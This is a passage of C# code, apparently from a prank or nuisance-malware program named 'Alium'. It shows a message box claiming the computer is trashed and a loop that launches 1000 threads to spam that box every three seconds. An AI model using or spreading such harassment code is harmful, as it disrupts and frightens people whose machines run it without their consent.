            MessageBox.Show("THIS COMPUTER IS TRASHED.\n\r" + "WHY ARE YOU STILL USING IT?! :D", "1 new message from Alium", MessageBoxButtons.OK, msgboxico);
        }
        public void DumbBoxSpamLaunchMethod()
        {
            for (int i = 0; i < 1000; i++)
            {
                Thread DumbBoxLaunchThread = new Thread(DumbBoxSpamMethod);
                DumbBoxLaunchThread.Start();
                Thread.Sleep(3000);
            }
        }
    }
}